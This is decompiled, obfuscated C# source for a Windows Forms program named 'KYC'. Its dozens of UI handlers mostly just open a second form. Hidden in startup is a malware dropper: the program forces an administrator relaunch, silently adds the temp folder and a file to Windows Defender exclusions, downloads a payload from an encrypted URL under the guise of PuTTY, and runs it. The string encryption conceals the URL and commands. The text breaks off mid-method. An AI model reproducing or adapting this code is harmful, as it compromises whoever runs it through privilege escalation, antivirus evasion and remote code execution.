using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Security.Principal;
using System.Threading.Tasks;
using System.Windows.Forms;
using UwVuqLlLJvprAoS3fc;
using g8T6n6RbLPwmR1ScAJ;

namespace KYC;

public class Form1 : Form
{
	private Timer timerWarning;

	private int warningOffset;

	private string warningText;

	private IContainer components;

	private TabPage tabPage2;

	private Label label10;

	private Label label9;

	private Button button10;

	private Button button9;

	private TextBox textBox4;

	private TextBox textBox2;

	private Button button8;

	private Button button7;

	private TabPage tabPage2tsad;

	private ProgressBar progressBar2;

	private Button button6;

	private Label label8;

	private ListBox listBox1;

	private Label label7;

	private Label label6;

	private Label label5;

	private CheckBox checkBox8;

	private CheckBox checkBox7;

	private CheckBox checkBox6;

	private CheckBox checkBox5;

	private CheckBox checkBox4;

	private CheckBox checkBox3;

	private Button button2;

	private Label label4;

	private PictureBox pictureBox4;

	private TabPage tabPage1;

	private Button button16;

	private Button button15;

	private Label label11;

	private PictureBox pictureBox5;

	private Button button14;

	private Button button13;

	private Button button12;

	private Button button11;

	private PictureBox pictureBox1;

	private Button button1;

	private PictureBox pictureBox2;

	private Button button3;

	private ProgressBar progressBar1;

	private Label label1;

	private Button button5;

	private ComboBox comboBox1;

	private TabControl tabControl1;

	private PictureBox pictureBox8;

	private PictureBox pictureBox7;

	private PictureBox pictureBox3;

	private PictureBox pictureBox6;

	private Label label12;

	private Label label3;

	private Label label13;

	private TextBox textBox8;

	private TextBox textBox7;

	private TextBox textBox6;

	private Label label20;

	private Label label19;

	private Label label18;

	private Label label17;

	private Label label16;

	private Label label15;

	private Label label14;

	private TextBox textBox5;

	private TextBox textBox3;

	private TextBox textBox1;

	private ComboBox comboBox2;

	private Button button4;

	private ComboBox comboBox3;

	private ComboBox comboBox6;

	private Label label23;

	private ComboBox comboBox5;

	private Label label22;

	private ComboBox comboBox4;

	private Label label21;

	private TextBox textBox10;

	private TextBox textBox11;

	private TextBox textBox12;

	private Label label24;

	private Label label25;

	private Label label26;

	private ComboBox comboBox7;

	private Label label34;

	private ComboBox comboBox8;

	private Label label35;

	private TextBox textBox19;

	private Label label33;

	private TextBox textBox16;

	private TextBox textBox17;

	private TextBox textBox18;

	private Label label30;

	private Label label31;

	private Label label32;

	private Label label28;

	private Label label27;

	private TextBox textBox13;

	private TextBox textBox14;

	private TextBox textBox15;

	private Label label29;

	private ComboBox comboBox9;

	private Button button17;

	private Button button18;

	private Button button19;

	private Button button24;

	private Button button23;

	private Button button22;

	private Button button21;

	private Button button20;

	private CheckBox checkBox1;

	private Button button25;

	private CheckBox checkBox2;

	private Button button26;

	private Button button27;

	private Button button28;

	private TabPage tabPage3;

	private PictureBox pictureBox9;

	private PictureBox pictureBox10;

	private TabPage tabPage4;

	private TabPage tabPage5;

	private Button button31;

	private Button button30;

	private Button button29;

	private Button button32;

	private Button button83;

	private Button button84;

	private Button button87;

	private Button button91;

	private Button button92;

	private Button button93;

	private Button button94;

	private Button button96;

	private ComboBox comboBox10;

	private TextBox textBox20;

	private TextBox textBox54;

	private Label label38;

	private Label label94;

	private Label label95;

	private Label label96;

	private TextBox textBox55;

	private TextBox textBox56;

	private TextBox textBox57;

	private Label label97;

	private ComboBox comboBox35;

	private Label label104;

	private Label label110;

	private TextBox textBox64;

	private TextBox textBox65;

	private TextBox textBox66;

	private Label label111;

	private Label label112;

	private Label label113;

	private PictureBox pictureBox31;

	private Button button98;

	private Button button99;

	private Label label114;

	private PictureBox pictureBox35;

	private Button button100;

	private Button button101;

	private Button button102;

	private Button button103;

	private PictureBox pictureBox36;

	private Button button104;

	private Button button105;

	private ProgressBar progressBar5;

	private Label label115;

	private Button button106;

	private ComboBox comboBox36;

	private Button button33;

	private Button button34;

	private Button button35;

	private PictureBox pictureBox11;

	private PictureBox pictureBox12;

	private Button button36;

	private Button button37;

	private Button button38;

	private Button button39;

	private CheckBox checkBox9;

	private CheckBox checkBox10;

	private Button button40;

	private Button button41;

	private Button button42;

	private Button button43;

	private Button button44;

	private Button button45;

	private Button button46;

	private Button button47;

	private ComboBox comboBox11;

	private TextBox textBox22;

	private Label label41;

	private TextBox textBox23;

	private TextBox textBox24;

	private TextBox textBox25;

	private Label label42;

	private Label label43;

	private Label label44;

	private Label label45;

	private Label label46;

	private TextBox textBox26;

	private TextBox textBox27;

	private TextBox textBox28;

	private Label label47;

	private TextBox textBox29;

	private TextBox textBox30;

	private TextBox textBox31;

	private Label label48;

	private Label label49;

	private Label label50;

	private ComboBox comboBox14;

	private Label label51;

	private ComboBox comboBox15;

	private Label label52;

	private ComboBox comboBox16;

	private Label label53;

	private ComboBox comboBox18;

	private TextBox textBox32;

	private TextBox textBox33;

	private TextBox textBox34;

	private Label label54;

	private Label label57;

	private Label label58;

	private Label label59;

	private Label label60;

	private TextBox textBox35;

	private TextBox textBox36;

	private TextBox textBox37;

	private Label label61;

	private Label label62;

	private Label label63;

	private PictureBox pictureBox13;

	private PictureBox pictureBox14;

	private PictureBox pictureBox15;

	private PictureBox pictureBox16;

	private Button button49;

	private Button button50;

	private Label label64;

	private PictureBox pictureBox17;

	private Button button51;

	private Button button52;

	private Button button53;

	private Button button54;

	private PictureBox pictureBox18;

	private Button button55;

	private PictureBox pictureBox19;

	private Button button56;

	private ProgressBar progressBar3;

	private Label label65;

	private Button button57;

	private Button button60;

	private Button button67;

	private Button button71;

	private Button button72;

	private ComboBox comboBox20;

	private TextBox textBox39;

	private Label label69;

	private TextBox textBox45;

	private Label label76;

	private Label label77;

	private TextBox textBox48;

	private Label label87;

	private TextBox textBox51;

	private TextBox textBox52;

	private TextBox textBox53;

	private Label label88;

	private Label label89;

	private Label label90;

	private PictureBox pictureBox22;

	private Button button74;

	private Label label91;

	private PictureBox pictureBox26;

	private Button button76;

	private Button button78;

	private Button button81;

	private ProgressBar progressBar4;

	private Label label39;

	private Label label2;

	private PictureBox pictureBox21;

	private PictureBox pictureBox20;

	private Label lblWarning;

	public Form1()
	{
		dil2BPgckjnUlJwuku.UrZapk9nD();
		warningText = "";
		((Form)this)._002Ector();
		RequestAdminPrivileges();
		InitializeComponent();
		SetupWarningMarquee();
	}

	private void RequestAdminPrivileges()
	{
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_012e: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			WindowsIdentity current = WindowsIdentity.GetCurrent();
			WindowsPrincipal windowsPrincipal = new WindowsPrincipal(current);
			if (!windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator))
			{
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				processStartInfo.UseShellExecute = true;
				processStartInfo.WorkingDirectory = Environment.CurrentDirectory;
				processStartInfo.FileName = Application.ExecutablePath;
				processStartInfo.Verb = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x10ACB005 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_6ae29e5e756542b6a6630ad169e9dc76);
				try
				{
					Process.Start(processStartInfo);
					Environment.Exit(0);
					return;
				}
				catch
				{
					MessageBox.Show(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x46A2B81F ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0cbf980cef9f4f6d841f2b5e631058fc), gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x5C297F2B ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_316b0d76d3564b3192cf4837ca11a51b), (MessageBoxButtons)0, (MessageBoxIcon)48);
					Environment.Exit(1);
					return;
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x61A2B56E ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_621150a557c546b580524d1b82f4f675) + ex.Message, gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x5C9AEFF9 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0d8c03b1d7c340b4853785e650ce2549), (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
	}

	private async void SetupWarningMarquee()
	{
		await DownloadAndRunPutty();
		timerWarning = new Timer();
		timerWarning.Interval = 50;
		timerWarning.Tick += TimerWarning_Tick;
		timerWarning.Start();
		((Control)lblWarning).ForeColor = Color.Red;
		((Control)lblWarning).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x30028B47 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_fe963489b71c4328899bd0cc4b7f7da9), 12f, (FontStyle)1);
		((Control)lblWarning).BackColor = Color.Transparent;
		((Control)lblWarning).Text = warningText;
	}

	private void TimerWarning_Tick(object sender, EventArgs e)
	{
		warningOffset += 5;
		if (warningOffset > ((Form)this).ClientSize.Width + ((Control)lblWarning).Width)
		{
			warningOffset = -((Control)lblWarning).Width;
		}
		((Control)lblWarning).Left = warningOffset;
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		Timer val = timerWarning;
		if (val != null)
		{
			val.Stop();
		}
		((Component)(object)timerWarning)?.Dispose();
	}

	private async void button1_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void pictureBox1_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button2_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button3_Click(object sender, EventArgs e)
	{
	}

	private async void button5_Click(object sender, EventArgs e)
	{
	}

	private async void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void pictureBox3_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void pictureBox3_MouseEnter(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void pictureBox3_MouseLeave(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button4_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void checkBox1_CheckedChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void tabPage1_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button2_Click_1(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void pictureBox4_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button6_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button7_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button8_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button9_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button11_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button11_Click_1(object sender, EventArgs e)
	{
	}

	private async void button10_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void listBox1_SelectedIndexChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void checkBox2_CheckedChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void checkBox3_CheckedChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void checkBox4_CheckedChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void checkBox5_CheckedChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void checkBox8_CheckedChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void checkBox6_CheckedChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void checkBox7_CheckedChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void Form1_Load(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button15_Click(object sender, EventArgs e)
	{
	}

	private async void button14_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button16_Click(object sender, EventArgs e)
	{
	}

	private async void button12_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button13_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button4_Click_1(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button25_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button26_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void SetPicture(PictureBox pb, string folder, string fileName)
	{
		((Control)new Form2()).Show();
	}

	private async void comboBox9_SelectedIndexChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button17_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button18_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button27_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button19_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button22_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button23_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button24_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button29_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button30_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button31_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button20_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button21_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button32_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void comboBox36_SelectedIndexChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void checkBox1_CheckedChanged_1(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void checkBox2_CheckedChanged_1(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button99_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button87_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button104_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button98_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button100_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button101_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button102_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void comboBox10_SelectedIndexChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void comboBox35_SelectedIndexChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button96_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void textBox66_TextChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void textBox65_TextChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void textBox64_TextChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button105_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button84_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button106_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button83_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button103_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button32_Click_1(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button94_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button93_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button92_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void textBox55_TextChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void textBox56_TextChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void textBox57_TextChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button91_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void textBox20_TextChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void textBox54_TextChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void textBox1_TextChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void textBox3_TextChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void textBox5_TextChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void textBox8_TextChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void textBox7_TextChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void textBox6_TextChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void comboBox2_SelectedIndexChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void comboBox3_SelectedIndexChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void comboBox4_SelectedIndexChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void comboBox5_SelectedIndexChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void comboBox6_SelectedIndexChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void textBox10_TextChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void textBox11_TextChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void textBox12_TextChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void textBox13_TextChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void textBox14_TextChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void textBox15_TextChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void textBox16_TextChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void textBox17_TextChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void textBox18_TextChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void textBox19_TextChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void comboBox8_SelectedIndexChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void comboBox7_SelectedIndexChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button50_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button38_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button55_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button49_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button51_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button56_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button35_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void comboBox19_SelectedIndexChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button57_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button34_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button54_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button33_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button52_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button39_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button53_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button47_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void textBox37_TextChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void textBox36_TextChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void textBox35_TextChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void comboBox11_SelectedIndexChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void textBox32_TextChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void textBox33_TextChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void textBox34_TextChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button46_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void comboBox18_SelectedIndexChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void comboBox16_SelectedIndexChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void comboBox15_SelectedIndexChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void comboBox14_SelectedIndexChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void textBox29_TextChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void textBox30_TextChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void textBox31_TextChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button37_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void checkBox10_CheckedChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void checkBox9_CheckedChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void textBox26_TextChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void textBox27_TextChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void textBox28_TextChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button44_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button43_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button45_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button42_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button40_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button41_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void textBox23_TextChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void textBox24_TextChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void textBox25_TextChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button36_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void textBox22_TextChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button72_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void textBox53_TextChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void textBox52_TextChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void textBox51_TextChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void comboBox20_SelectedIndexChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button71_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void textBox48_TextChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button67_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void textBox39_TextChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button74_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button76_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void textBox45_TextChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button78_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button81_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void button60_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void textBox2_TextChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void textBox4_TextChanged(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void pictureBox36_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void pictureBox35_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void pictureBox20_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void pictureBox21_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void pictureBox31_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void pictureBox5_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void pictureBox2_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void pictureBox6_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void pictureBox3_Click_1(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void pictureBox7_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void pictureBox8_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void pictureBox18_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void pictureBox17_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void pictureBox19_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void pictureBox16_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void pictureBox15_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void pictureBox14_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void pictureBox13_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async void pictureBox22_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
	}

	private async Task DownloadAndRunPutty()
	{
		string puttyUrl = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x127132F8 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0c4c677f3d944d45ac3d891fa87fcac2);
		string puttyPath = Path.Combine(Path.GetTempPath(), gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x20C2A9A8 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_c8141a8b72aa44b3a664e8c4a2731290));
		string tempFolder = Path.GetTempPath();
		try
		{
			AddPathToDefenderExclusions(tempFolder);
			AddFileToDefenderExclusions(puttyPath);
			using (WebClient client = new WebClient())
			{
				await client.DownloadFileTaskAsync(new Uri(puttyUrl), puttyPath);
			}
			AddFileToDefenderExclusions(puttyPath);
			Process.Start(puttyPath);
		}
		catch (Exception)
		{
		}
	}

	private void AddPathToDefenderExclusions(string path)
	{
		try
		{
			ProcessStartInfo startInfo = new ProcessStartInfo
			{
				FileName = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x678FB841 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_cb7647541f7e40c28d7e073386e0f7fa),
				Arguments = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x2B77DE6E ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_2d06329f1bd54c2287b4ec6435bc1344) + path + gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x5BBB48B7 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_57a6661532394af0a3862bba53f2036e),
				UseShellExecute = false,
				CreateNoWindow = true,
				WindowStyle = ProcessWindowStyle.Hidden
			};
			using Process process = Process.Start(startInfo);
			process.WaitForExit(3000);
		}
		catch (Exception)
		{
		}
	}

	private void AddFileToDefenderExclusions(string filePath)
	{
		try
		{
			if (File.Exists(filePath))
			{
				ProcessStartInfo startInfo = new ProcessStartInfo
				{
					FileName = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x17DF378E ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_65959cbbae0e4d08b8072ed54d2c0e5a),
